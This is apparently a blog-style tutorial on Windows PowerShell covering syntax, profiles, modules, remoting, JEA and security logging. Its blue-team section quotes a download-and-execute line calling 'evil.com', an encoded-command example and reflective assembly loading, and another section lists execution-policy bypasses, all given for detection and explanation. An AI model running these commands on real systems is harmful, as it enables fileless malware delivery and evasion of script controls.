---
title: "Windows - PowerShell: Scripting and Automation"
date: "2026-05-13"
---

PowerShell is not just a command line. It is a full object-oriented shell and programming language built into Windows. Unlike cmd, which passes text, PowerShell passes objects - structured data with properties and methods. This changes everything: you don't need to parse output with regex, you can access any field directly by name.

---

## What PowerShell Is and Where It Lives

### Two Different PowerShells

```
On a modern Windows machine you may encounter two versions:

Windows PowerShell (built-in, legacy)
  Versions: 1.0 -> 2.0 -> 3.0 -> 4.0 -> 5.0 -> 5.1 (final)
  Engine:   .NET Framework (Windows only)
  Executable:
    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe   (64-bit)
    C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe   (32-bit)
  Status:   frozen, Microsoft no longer develops it

PowerShell (new, cross-platform)
  Versions: 6.x -> 7.0 -> 7.1 -> 7.2 -> 7.3 -> 7.4 -> 7.5 (active development)
  Engine:   .NET (Core) - works on Windows, Linux, macOS
  Installed separately, does not replace the built-in version
  Executable (after install):
    C:\Program Files\PowerShell\7\pwsh.exe
  Status:   active development, recommended for new projects

How to check version:
  $PSVersionTable                      - full environment info
  $PSVersionTable.PSVersion.Major      - major version number only
```

```
Why this matters:
- Modules written for Windows PowerShell 5.1 may not work in PS 7
  (if they use Windows-specific .NET APIs)
- The AD module (ActiveDirectory) only works in Windows PowerShell 5.1
  (or via compatibility shim in PS 7)
- Servers without PS 7 installed only have 5.1 available
- Security scripts more often use 5.1 because it is everywhere
```

### PowerShell Profiles

```
A profile is a script that automatically runs at the start of
every new PowerShell session. Similar to .bashrc on Linux.

The $PROFILE variable holds the path to the current user's profile.
There are several profile levels (from most specific to most general):

$PROFILE.CurrentUserCurrentHost    - current user, current host (PS/ISE/VSCode)
  Path: C:\Users\alice\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1

$PROFILE.CurrentUserAllHosts       - current user, all hosts
  Path: C:\Users\alice\Documents\WindowsPowerShell\profile.ps1

$PROFILE.AllUsersCurrentHost       - all users, current host
  Path: C:\Windows\System32\WindowsPowerShell\v1.0\Microsoft.PowerShell_profile.ps1

$PROFILE.AllUsersAllHosts          - all users, all hosts
  Path: C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1

If the profile file does not exist - nothing happens, that is normal.
$PROFILE just shows the path, but the file may be absent.

From a security standpoint: attackers may add code to profiles for persistence.
During incident response - check all profile locations.
```

### Where Modules Are Stored

```
A module is a package of functions, cmdlets, providers, and other resources.
Get-Module -ListAvailable shows all available modules.

Module search paths are stored in $env:PSModulePath
(like PATH for executables, but for modules)

Typical paths (semicolon-separated):
  C:\Users\alice\Documents\WindowsPowerShell\Modules       <- user modules
  C:\Program Files\WindowsPowerShell\Modules               <- system (all users)
  C:\Windows\System32\WindowsPowerShell\v1.0\Modules       <- built-in Windows modules
  C:\Program Files (x86)\...                               <- 32-bit apps

Built-in Windows modules (examples):
  Microsoft.PowerShell.Management    - Get-ChildItem, Get-Process, Get-Service...
  Microsoft.PowerShell.Security      - Get-Acl, ConvertTo-SecureString...
  Microsoft.PowerShell.Utility       - Write-Output, Format-Table, Measure-Object...
  Microsoft.PowerShell.Diagnostics   - Get-WinEvent, Get-EventLog
  ActiveDirectory                    - Get-ADUser, New-ADGroup... (via RSAT)
  NetTCPIP                           - Get-NetIPAddress, Test-NetConnection
  ServerManager                      - Install-WindowsFeature

Module folder structure:
  C:\...\Modules\
  └── MyModule\
      ├── MyModule.psd1    <- module manifest (metadata)
      ├── MyModule.psm1    <- main file with functions
      └── en-US\
          └── MyModule.dll-Help.xml  <- help content
```

---

## Execution Policy

```
Execution Policy is NOT a security system. It is a safeguard against
accidentally running scripts. Anyone who wants to bypass it - will.

Policies (from most restrictive to most permissive):

Restricted       - everything blocked (.ps1 scripts cannot run)
                   This is the default on client Windows editions
                   Interactive commands in the console still work

AllSigned        - only scripts signed by a trusted publisher

RemoteSigned     - local scripts - no signature required
                   scripts from the internet (ZoneIdentifier ADS mark) - signature required
                   This is the default on server Windows editions

Unrestricted     - everything allowed, but warning for internet scripts

Bypass           - everything allowed, no warnings
                   Used in automation, CI/CD pipelines

Undefined        - policy not set at this level, next level applies

Policy levels (from highest to lowest priority):
  MachinePolicy    - from GPO (Computer Configuration) - cannot be overridden
  UserPolicy       - from GPO (User Configuration)
  Process          - for the current PowerShell process (-ExecutionPolicy at launch)
  CurrentUser      - in registry: HKCU\Software\Microsoft\PowerShell\...
  LocalMachine     - in registry: HKLM\Software\Microsoft\PowerShell\...

Registry location:
  HKLM\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell\
    ExecutionPolicy = RemoteSigned

  HKCU\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell\
    ExecutionPolicy = Unrestricted
```

```
Why Execution Policy is not real security:

1. Launch with parameter:
   powershell.exe -ExecutionPolicy Bypass -File script.ps1

2. Pipe script via stdin:
   Get-Content script.ps1 | powershell.exe -

3. Base64 encode:
   powershell.exe -EncodedCommand <base64 string>

4. Via .NET directly:
   [System.Management.Automation.PowerShell]::Create().AddScript("...").Invoke()

5. Via WMIC or other launchers

Real protection comes from Script Block Logging, AppLocker / WDAC (allowlisting),
and monitoring for anomalous script execution.
```

---

## How PowerShell Finds and Runs Commands

### Command Resolution Order

```
When you type a command, PowerShell looks for it in this order:

1. Alias          - short names (ls -> Get-ChildItem, cat -> Get-Content)
2. Function        - functions defined in the current session or profile
3. Cmdlet          - built-in cmdlets (.NET classes)
4. External script - .ps1 file in $env:PATH or with explicit path
5. Application     - .exe, .cmd, .bat in $env:PATH

If a name matches more than one - the first by priority wins.
To explicitly specify the type - use & (call operator) or full path:
  & "C:\scripts\tool.exe"
  & ".\myscript.ps1"
```

### Pipeline - Object Pipeline

```
The most important concept in PowerShell is the pipeline (|).

In cmd: commands pass TEXT
  dir | find "exe"
  -> find parses text line by line with pattern matching

In PowerShell: commands pass OBJECTS
  Get-Process | Where-Object { $_.CPU -gt 100 }
  -> Where-Object receives Process objects and filters by the CPU property

This means:
  - No need to parse text with regex
  - You can access any object property by name
  - Objects preserve their data type (a number stays a number, a date stays a date)

$_ (or $PSItem) - automatic variable meaning "current object in the pipeline"
```

### Cmdlet Naming Convention

```
All cmdlets follow the convention: Verb-Noun

Common verbs:
  Get-     retrieve information (Get-Process, Get-ADUser, Get-Service)
  Set-     modify existing (Set-ADUser, Set-Service)
  New-     create new (New-ADUser, New-Item, New-PSSession)
  Remove-  delete (Remove-ADUser, Remove-Item)
  Add-     add to existing (Add-ADGroupMember, Add-Content)
  Enable-  enable (Enable-ADAccount, Enable-PSRemoting)
  Disable- disable (Disable-ADAccount)
  Start-   start (Start-Service, Start-Process, Start-Job)
  Stop-    stop (Stop-Service, Stop-Process)
  Import-  import data (Import-Csv, Import-Module)
  Export-  export (Export-Csv, Export-Clixml)
  Test-    check without changing (Test-NetConnection, Test-Path)
  Invoke-  execute an action (Invoke-Command, Invoke-RestMethod)
  Convert- transform format (ConvertTo-Json, ConvertFrom-Csv)
  Format-  format output (Format-Table, Format-List, Format-Wide)

See all available verbs: Get-Verb
Find cmdlets by partial name: Get-Command *process*
Find cmdlets by verb: Get-Command -Verb Get -Noun *AD*
```

---

## Data Types and Variables

### Variables

```
Variables start with the $ symbol
Names are case-insensitive: $Name = $name = $NAME

$myVar = "hello"          # string
$count = 42               # integer
$pi = 3.14                # floating point
$isTrue = $true           # boolean ($true / $false)
$nothing = $null          # null (no value)
$arr = @(1, 2, 3)         # array
$hash = @{ Key = "Val" }  # hashtable (dictionary)

Type is inferred automatically, but can be specified explicitly:
[int]$count = "42"        # force int, "42" is converted
[string]$name = 100       # force string, 100 becomes "100"
[datetime]$date = "2026-01-01"  # parses string to datetime

Special automatic variables:
  $null       - null value
  $true       - True
  $false      - False
  $_          - current object in pipeline
  $args       - array of arguments in a function without param()
  $error      - array of recent errors (last one: $error[0])
  $?          - True if the last command succeeded
  $LASTEXITCODE - exit code of the last external program (0 = success)
  $PSScriptRoot - directory where the current .ps1 file is located
  $MyInvocation - info about the current command/script
  $env:PATH     - the PATH environment variable (access any via $env:NAME)
```

### Strings

```
PowerShell has two types of strings:

Single quotes: '...'
  - Literal string, no substitutions
  - $name in single quotes is the text "$name", not the variable's value
  - Use when you need text as-is

Double quotes: "..."
  - Variables are interpolated
  - "Hello $name" -> "Hello alice"
  - Expressions via $(...): "Files: $(Get-ChildItem | Measure-Object).Count)"
  - Escape sequences: `n (newline), `t (tab), `$ (literal $), `" (quote inside)

Here-String (multiline strings):
  @"
  This is a multiline string
  $name - will be substituted
  "@                                 <- closing tag MUST be on its own line with no leading spaces

  @'
  This is a multiline string
  $name - will NOT be substituted
  '@
```

### Arrays and Hashtables

```
Array - ordered collection of objects:
  $arr = @(1, "two", $true, (Get-Date))  # mixed types - OK
  $arr[0]       # first element = 1
  $arr[-1]      # last element
  $arr[1..3]    # slice from index 1 to 3
  $arr.Count    # number of elements
  $arr += 5     # add element (creates a new array!)

Hashtable - key-value store (unordered dictionary):
  $hash = @{
      Name = "alice"
      Age  = 30
      City = "London"
  }
  $hash["Name"]    # "alice"
  $hash.Name       # same thing, dot notation
  $hash.Keys       # all keys
  $hash.Values     # all values
  $hash["Email"] = "alice@corp.com"   # add or update

Ordered dictionary (insertion order preserved):
  $ordered = [ordered]@{ First = 1; Second = 2; Third = 3 }
```

---

## Flow Control

### Conditions

```
if / elseif / else:
  if ($x -gt 10) {
      "greater than 10"
  } elseif ($x -eq 10) {
      "equals 10"
  } else {
      "less than 10"
  }

Comparison operators (NOT < > = like other languages!):
  -eq   equal
  -ne   not equal
  -gt   greater than
  -lt   less than
  -ge   greater or equal
  -le   less or equal
  -like  wildcard match ("alice*")
  -match regex match
  -contains  array contains value
  -in        value is in array (reverse contains)
  -not       logical NOT (or !)
  -and       logical AND
  -or        logical OR

Operators are case-insensitive by default.
For case-sensitive versions: -ceq, -clike, -cmatch
```

### Loops

```
foreach (most common in scripts):
  foreach ($user in $users) {
      Write-Host "Processing $($user.Name)"
  }

ForEach-Object (in pipeline):
  $users | ForEach-Object { Write-Host $_.Name }

for (classic counter loop):
  for ($i = 0; $i -lt 10; $i++) {
      Write-Host "Iteration $i"
  }

while:
  while ($running) {
      Start-Sleep 1
      $running = Test-Connection -ComputerName server -Quiet
  }

do-while / do-until:
  do {
      $input = Read-Host "Enter Y to continue"
  } while ($input -ne "Y")

break    - exit the loop
continue - skip to the next iteration
```

---

## Functions and Scripts

### Functions

```
Functions are reusable blocks of code.

Simple function:
  function Say-Hello {
      param([string]$Name = "World")
      Write-Output "Hello, $Name!"
  }
  Say-Hello -Name "Alice"   # named parameter call
  Say-Hello "Alice"          # positional parameter call

Advanced function (with attributes):
  function Get-UserReport {
      [CmdletBinding()]    # makes function "advanced" - adds -Verbose, -WhatIf, etc.
      param(
          [Parameter(Mandatory)]         # required parameter
          [string]$Username,

          [Parameter()]
          [ValidateSet("Short","Full")]  # only these values allowed
          [string]$ReportType = "Short",

          [switch]$IncludeDisabled       # switch: -IncludeDisabled sets it to $true
      )

      # function body
      $user = Get-ADUser $Username -Properties *
      if (-not $user) {
          Write-Error "User $Username not found"
          return
      }
      # ...
  }
```

### .ps1 Script Structure

```
Typical structure of a well-written script:

#Requires -Version 5.1                     # minimum PowerShell version
#Requires -Modules ActiveDirectory         # required modules
#Requires -RunAsAdministrator              # must run as admin

<#
.SYNOPSIS
    Brief description of what the script does.
.DESCRIPTION
    Detailed description. Appears in Get-Help.
.PARAMETER Username
    Description of the parameter.
.EXAMPLE
    .\script.ps1 -Username alice.smith
.NOTES
    Author: John Doe
    Date:   2026-05-12
#>

[CmdletBinding(SupportsShouldProcess)]   # supports -WhatIf and -Confirm
param(
    [Parameter(Mandatory, HelpMessage="Enter the username")]
    [string]$Username,

    [string]$OutputPath = "C:\Reports"
)

Set-StrictMode -Version Latest   # error on access to undefined variables
$ErrorActionPreference = "Stop"  # any error becomes an exception (good for scripts)

# --- Main code ---

function Main {
    Write-Verbose "Starting script for user $Username"
    # ...
}

Main
```

### Where to Store Scripts

```
No single standard, but common practices:

Local scripts:
  C:\Scripts\                      # system-wide scripts (all users)
  C:\Users\alice\Scripts\          # scripts for a specific user

Corporate scripts:
  \\fileserver\Scripts\            # network share (but Execution Policy may block!)
  Scheduled tasks usually run from C:\Scripts\ - no network dependency

Auto-run via GPO:
  Startup Scripts:  Computer Configuration -> Windows Settings -> Scripts -> Startup
    \\domain.com\SYSVOL\domain.com\Policies\{GUID}\Machine\Scripts\Startup\
  Logon Scripts:   User Configuration -> Windows Settings -> Scripts -> Logon
    \\domain.com\SYSVOL\domain.com\Policies\{GUID}\User\Scripts\Logon\

Scheduled Tasks (most flexible):
  powershell.exe -ExecutionPolicy Bypass -NonInteractive -File "C:\Scripts\myjob.ps1"
  pwsh.exe -NonInteractive -File "C:\Scripts\myjob.ps1"
```

---

## Error Handling

### PowerShell Output Streams

```
PowerShell has 6 output streams (unlike cmd which only has stdout/stderr):

Stream 1: Output (Success)   - command result, passes through pipeline
Stream 2: Error              - errors (Write-Error, exceptions)
Stream 3: Warning            - warnings (Write-Warning)
Stream 4: Verbose            - detailed info (Write-Verbose)
                               Only visible with -Verbose or $VerbosePreference = "Continue"
Stream 5: Debug              - debug info (Write-Debug)
                               Only visible with -Debug or $DebugPreference = "Continue"
Stream 6: Information        - informational messages (Write-Information, Write-Host)

Stream redirection:
  command 2>&1          # error stream to output (like bash)
  command *>&1          # all streams to output
  command 2>errors.txt  # error stream to file
  command 6>info.txt    # information stream to file

Write-Host vs Write-Output:
  Write-Host   - writes directly to screen, BYPASSES the pipeline
                 Use for user messages, not for data
  Write-Output - sends to pipeline (stream 1)
                 This is the "return value" of a function/script
```

### Error Types and ErrorActionPreference

```
In PowerShell there are two kinds of errors:

Terminating Error:
  - Completely stops the cmdlet execution
  - Generated via throw or Write-Error with -ErrorAction Stop
  - Caught via try/catch

Non-terminating Error:
  - Written to $error and displayed, but execution continues
  - Most cmdlet errors are non-terminating by default
  - "File not found" from Get-Item = non-terminating error

$ErrorActionPreference - global error handling setting:
  Continue          - show error and continue (default in interactive session)
  Stop              - turn any error into an exception (best for scripts)
  SilentlyContinue  - suppress the error and continue (use carefully)
  Inquire           - ask what to do on each error

Per-command override: -ErrorAction Stop/Continue/SilentlyContinue
  Get-Item "C:\nonexistent" -ErrorAction SilentlyContinue   # no error shown
  Get-Item "C:\nonexistent" -ErrorAction Stop                # throws exception
```

### Try / Catch / Finally

```
try {
    # code that might throw
    $result = Get-ADUser "alice" -ErrorAction Stop
    Write-Output "Found: $($result.Name)"
}
catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException] {
    # catch a specific exception type
    Write-Warning "User not found: $_"
}
catch {
    # catch any exception
    Write-Error "Unexpected error: $($_.Exception.Message)"
    Write-Error "Exception type: $($_.Exception.GetType().FullName)"
    # $_ inside catch = the ErrorRecord object
}
finally {
    # runs ALWAYS - on success and on error
    # good for cleanup: close connections, delete temp files
    Write-Verbose "Finally block executed"
}
```

---

## Remoting - Remote Execution

### How WinRM Works

```
WinRM (Windows Remote Management) is the protocol and service
that enables remote execution of PowerShell commands.

Based on WS-Management (web service over HTTP/HTTPS).

Transport:
  HTTP:  port 5985 (data is encrypted at the protocol level, not TLS)
  HTTPS: port 5986 (TLS encryption, requires a certificate)

Authentication:
  Kerberos   - default in a domain (no password sent over the network)
  NTLM       - when Kerberos is unavailable
  Basic      - username/password in base64 (HTTPS only!)
  CredSSP    - credentials delegated to the remote host (Double-Hop solution)
  Certificate - client certificate

What is required:
  On the remote machine: Enable-PSRemoting (starts WinRM, configures firewall)
  In a domain: GPO usually already enables WinRM on servers
  Firewall: inbound rule "Windows Remote Management (HTTP-In)"
```

```
Two approaches to remote execution:

Invoke-Command (no persistent session):
  Invoke-Command -ComputerName SERVER01 -ScriptBlock { Get-Service }
  One request - one response, connection closes
  Good for single commands or small scripts

PSSession (persistent session):
  $session = New-PSSession -ComputerName SERVER01
  Invoke-Command -Session $session -ScriptBlock { $data = Get-Process }
  Invoke-Command -Session $session -ScriptBlock { $data | Format-Table }  # $data is preserved!
  Remove-PSSession $session
  Good when you need multiple requests; variables persist between calls
```

### The Double-Hop Problem

```
Double-Hop is a classic problem with remote execution.

The problem:
  You are on WKS001 and connect to SERVER01 via Remoting.
  From the session on SERVER01 you try to access \\FILESERVER\share.
  You get "Access Denied".

Why:
  The Kerberos ticket for WKS001->SERVER01 is an impersonation token.
  It cannot be used for the next hop: WKS001->SERVER01->FILESERVER.
  Credentials are not delegated automatically.

Solutions:

1. CredSSP (simplest, but reduces security):
   Credentials are physically sent to SERVER01 and stored in memory.
   Risk: if SERVER01 is compromised - credentials can be stolen.
   Enable-WSManCredSSP -Role Client -DelegateComputer SERVER01  # on client
   Enable-WSManCredSSP -Role Server                             # on SERVER01

2. Kerberos Constrained Delegation (correct way in a domain):
   AD is configured so SERVER01 can delegate credentials to FILESERVER.
   Set by AD admin on the SERVER01 computer object.
   No credentials are transmitted.

3. Explicit credentials in Invoke-Command:
   $cred = Get-Credential
   Invoke-Command -ComputerName FILESERVER -Credential $cred { ... }
   Works, but credentials need to be stored/passed.

4. Just Enough Administration (JEA):
   Create an endpoint with a virtual account that already has access to FILESERVER.
```

---

## Modules and Package Management

### PowerShell Gallery and PSRepository

```
PowerShell Gallery - the official repository for modules and scripts.
URL: https://www.powershellgallery.com
Analogous to npm for Node.js or pip for Python.

Commands:
  Find-Module Az                      # search for a module
  Install-Module Az                   # install
  Update-Module Az                    # update
  Uninstall-Module Az                 # remove
  Get-InstalledModule                 # list installed modules

Where modules are installed:
  Install-Module ModuleName -Scope AllUsers
    -> C:\Program Files\WindowsPowerShell\Modules\ModuleName\

  Install-Module ModuleName -Scope CurrentUser
    -> C:\Users\alice\Documents\WindowsPowerShell\Modules\ModuleName\

Offline / internal repository:
  Register-PSRepository - register an internal repo
  NuGet server or a folder with .nupkg files

Popular modules from the Gallery:
  Az              - Azure PowerShell
  MSOnline        - Microsoft 365 (legacy but still used)
  Microsoft.Graph - Microsoft Graph API
  Pester          - PowerShell testing framework
  PSWindowsUpdate - Windows Update management
  ImportExcel     - work with Excel without installing Office
```

### Creating Your Own Module

```
A minimal module consists of two files:

1. MyModule.psm1 - the code file:
   function Get-MyData {
       param([string]$Name)
       return "Data for $Name"
   }

   function Set-MyConfig {
       # ...
   }

   Export-ModuleMember -Function Get-MyData, Set-MyConfig
   # Explicitly declare what is exported (visible outside the module)

2. MyModule.psd1 - manifest (created with New-ModuleManifest):
   @{
       ModuleVersion   = '1.0.0'
       Author          = 'John Doe'
       Description     = 'My module'
       RootModule      = 'MyModule.psm1'
       FunctionsToExport = @('Get-MyData', 'Set-MyConfig')
       RequiredModules = @('ActiveDirectory')
   }

Place the MyModule\ folder in one of the $env:PSModulePath paths
-> the module becomes automatically available via Import-Module MyModule
```

---

## PowerShell Security

### Script Block Logging

```
Script Block Logging - logging of all PowerShell code as it executes.
This is a powerful attack detection tool.

Without Script Block Logging:
  Only the launch of powershell.exe with its parameters is visible
  (from Process Creation event 4688)
  Content of obfuscated/encoded scripts - invisible

With Script Block Logging:
  Content of EVERY executed code block is written to Event Log
  Even if the code was obfuscated or encoded - PowerShell decodes it
  before execution, and the decoded version is logged

Where to look:
  Event Log: Microsoft-Windows-PowerShell/Operational
  Event ID 4104 - Script Block Logging (Script block compiled)

Enable via GPO:
  Computer Configuration -> Administrative Templates ->
  Windows Components -> Windows PowerShell
  -> "Turn on PowerShell Script Block Logging" = Enabled

Registry:
  HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\
    EnableScriptBlockLogging = 1
    EnableScriptBlockInvocationLogging = 1  (log every invocation, not just compilation)

Note: very detailed logging. On busy systems expect many events.
```

### Constrained Language Mode

```
Constrained Language Mode (CLM) - a restricted PowerShell language mode.
Blocks dangerous language capabilities.

Blocked in CLM:
  - Direct access to .NET types ([System.Reflection.Assembly]::Load...)
  - COM objects (New-Object -ComObject ...)
  - Add-Type (compiling C# code in memory)
  - Most ways to bypass security restrictions

CLM is enabled automatically when:
  - AppLocker policy is configured
  - Windows Defender Application Control (WDAC) is active
  - Device Guard is enabled

Check current language mode:
  $ExecutionContext.SessionState.LanguageMode
  Result: FullLanguage / ConstrainedLanguage / RestrictedLanguage / NoLanguage

This is real protection (unlike Execution Policy).
```

### Dangerous Patterns (Blue Team Perspective)

```
When monitoring PowerShell, watch for:

EncodedCommand / -enc:
  powershell.exe -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALi4u
  Legitimate use: almost never
  Suspicious:     almost always - command obfuscation

IEX (Invoke-Expression) + DownloadString:
  IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
  Classic fileless malware pattern
  Downloads and immediately executes code from the internet

Reflection / Assembly Loading:
  [System.Reflection.Assembly]::LoadWithPartialName(...)
  [System.Reflection.Assembly]::Load([Convert]::FromBase64String(...))
  Loading .NET assemblies to bypass AppLocker

AMSI Bypass patterns:
  AMSI (Antimalware Scan Interface) - Windows API for scanning scripts via AV
  Attackers try to disable/bypass it via memory patching or reflection

PowerShell Remoting without UI:
  powershell -NonInteractive -WindowStyle Hidden
  Script running in background with no UI - sign of automated attack

Loading from non-standard paths:
  C:\Users\*\AppData\Local\Temp\
  C:\ProgramData\
  Paths with random GUID-like names
```

---

## Just Enough Administration (JEA)

```
JEA - a mechanism for limiting administrative privileges through
specially configured PowerShell Remoting endpoints.

Concept:
  Instead of "give the user Local Admin rights" - create a JEA endpoint.
  The user connects to the endpoint via PSSession.
  The endpoint runs under a virtual account (a temporary local admin).
  But the user only sees the allowed cmdlets and parameters.

Example: HelpDesk restarts only specific services
  Without JEA: needs Admin rights -> dangerous
  With JEA:    HelpDesk runs Restart-Service -Name Spooler
               everything else is blocked, the virtual account does the actual work

JEA components:
  Role Capability File (.psrc)     - what is allowed (cmdlets, parameters)
  Session Configuration File (.pssc) - endpoint settings (who can connect)

Where it lives:
  Role Capabilities:
    C:\Program Files\WindowsPowerShell\Modules\<ModuleName>\RoleCapabilities\*.psrc

  Session Configuration:
    Register-PSSessionConfiguration - registers the endpoint
    C:\Windows\System32\wsmprovhost.exe - host process for JEA sessions

Logging in JEA:
  All JEA sessions can be logged to transcript files
  You can see everything the user did and under which identity it ran
```

---

## Practical Scenarios

### What Happens When a Script Runs

```
1. powershell.exe starts as a new process
2. PowerShell loads the profile (if present and -NoProfile is not specified)
3. Execution Policy is checked
4. If the script was downloaded from the internet (ADS Zone.Identifier mark) -
   RemoteSigned policy is applied
5. Script is compiled into a ScriptBlock
6. If Script Block Logging is enabled - ScriptBlock is written as Event 4104
7. If AMSI is enabled - content is passed to the antivirus for scanning
8. Code executes
9. On completion - $LASTEXITCODE is set to 0 (success) or != 0 (error)
```

### Automation via Task Scheduler

```
Scheduled Tasks are the primary way to run PowerShell on a schedule.

Best practices:
- Run under a service account (not a user account, not SYSTEM unless needed)
- Use -ExecutionPolicy Bypass -NonInteractive -NoProfile
  (no dependency on system settings)
- Log results to a file (the script writes its own log)
- Store scripts in C:\Scripts\, not in a user profile

Typical Task Scheduler command:
  Program:   powershell.exe
  Arguments: -ExecutionPolicy Bypass -NonInteractive -NoProfile
             -File "C:\Scripts\DailyCleanup.ps1"
             -LogPath "C:\Logs\DailyCleanup.log"

Where to check task history:
  Event Log: Microsoft-Windows-TaskScheduler/Operational
  Event 200 - task launched
  Event 201 - task completed (with exit code)
  Event 202 - task completed with error
```

### Debugging and Testing Scripts

```
Core debugging tools:

Write-Verbose and -Verbose:
  Add Write-Verbose at key points in the script.
  Run with -Verbose when you need detailed output.
  In production skip -Verbose - output stays clean.

Set-PSBreakpoint (built-in debugger):
  Set-PSBreakpoint -Script "C:\script.ps1" -Line 42
  Run the script -> execution stops at line 42
  Inspect variables, step through lines

VSCode with PowerShell extension:
  Best environment for developing and debugging scripts.
  Breakpoints, variable inspection, integrated console.
  Extension: ms-vscode.PowerShell

Pester - unit testing:
  Describe "Get-UserReport" {
      It "Returns data for existing user" {
          $result = Get-UserReport -Username "alice"
          $result | Should -Not -BeNullOrEmpty
      }
      It "Throws for non-existent user" {
          { Get-UserReport -Username "notexist" } | Should -Throw
      }
  }
```

---

## Cheat Sheet

```
WHERE THINGS LIVE
  PS 5.1 executable:         C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  PS 7 executable:           C:\Program Files\PowerShell\7\pwsh.exe
  User profiles:             C:\Users\<user>\Documents\WindowsPowerShell\
  System profiles:           C:\Windows\System32\WindowsPowerShell\v1.0\
  Built-in modules:          C:\Windows\System32\WindowsPowerShell\v1.0\Modules\
  System modules:            C:\Program Files\WindowsPowerShell\Modules\
  User modules:              C:\Users\<user>\Documents\WindowsPowerShell\Modules\
  Execution Policy registry: HKLM\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell\
  Script Block Logging reg:  HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\

USEFUL BUILT-IN VARIABLES
  $PROFILE          path to current user profile
  $PSVersionTable   PowerShell version and environment
  $PSScriptRoot     directory of the current script
  $env:PSModulePath module search paths
  $error[0]         most recent error
  $?                success of the last command
  $_                current object in pipeline or in catch

KEY DIAGNOSTIC COMMANDS
  Get-Module -ListAvailable        all available modules
  Get-Module                       modules loaded in current session
  Get-Command -Module ActiveDirectory  all commands in a module
  Get-ExecutionPolicy -List        policy at all levels
  $PSVersionTable                  PowerShell version
  Get-PSSessionConfiguration       registered JEA/Remoting endpoints

POWERSHELL EVENT LOG EVENTS
  Channel: Microsoft-Windows-PowerShell/Operational
  4100  Execution error
  4103  Pipeline execution
  4104  Script Block Logging (script content)
  4105  Script started
  4106  Script completed

  Channel: Microsoft-Windows-WinRM/Operational
  6  WSMan session created (incoming Remoting session)
  8  WSMan session closed
```

---

## References

- [PowerShell Documentation](https://learn.microsoft.com/en-us/powershell/) - official docs
- [PowerShell Gallery](https://www.powershellgallery.com) - module repository
- [About Execution Policies](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies) - deep dive on Execution Policy
- [PowerShell Remoting](https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands) - how Remoting works
- [JEA Documentation](https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview) - Just Enough Administration
- [PowerShell Security Best Practices](https://devblogs.microsoft.com/powershell/powershell-security-best-practices/) - security hardening
- [Pester Testing Framework](https://pester.dev) - script testing
